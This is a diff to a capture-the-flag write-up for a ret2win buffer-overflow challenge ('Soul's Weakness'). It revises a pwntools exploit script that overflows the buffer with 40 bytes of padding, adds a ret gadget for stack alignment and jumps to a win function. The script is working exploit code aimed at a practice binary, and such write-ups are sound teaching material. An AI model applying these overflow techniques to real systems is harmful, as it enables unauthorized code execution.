@@ -105,10 +105,16 @@ To resolve this, we prepend a single `ret` gadget (`0x40101a`) before jumping to
 
 $$\text{Payload} = \text{"A"} \times 40 + \text{p64}(\text{ret}) + \text{p64}(\text{soul\_stone})$$
 
-### Exploit Script (`exploit.py`)
+### Exploit & Solver Script (`solve.py` / `exploit.py`)
 
 ```python
 #!/usr/bin/env python3
+"""
+Soul's Weakness - Buffer Overflow Ret2Win Exploit
+Author: Suyog Jadhav
+Category: Binary Exploitation / Pwn (Easy)
+"""
+
 from pwn import *
 
 context.arch = 'amd64'
@@ -119,11 +125,12 @@ PORT = 1337
 if args.REMOTE:
     io = remote(HOST, PORT)
 else:
-    io = process("./soul")
+    bin_path = "./soul-stone-pwn/challenge/soul" if os.path.exists("./soul-stone-pwn/challenge/soul") else "./soul"
+    io = process(bin_path)
 
-# Addresses (No-PIE)
+# Addresses (No-PIE x86-64)
 soul_stone = 0x4011d6
-ret_gadget = 0x40101a # For 16-byte stack alignment
+ret_gadget = 0x40101a  # 16-byte stack alignment for glibc movaps
 
 offset = 40
 payload = flat({
@@ -133,7 +140,7 @@ payload = flat({
     ]
 })
 
-io.sendlineafter(b"> ", payload)
+io.sendlineafter(b"Enter your name: ", payload)
 io.interactive()
 ```
 
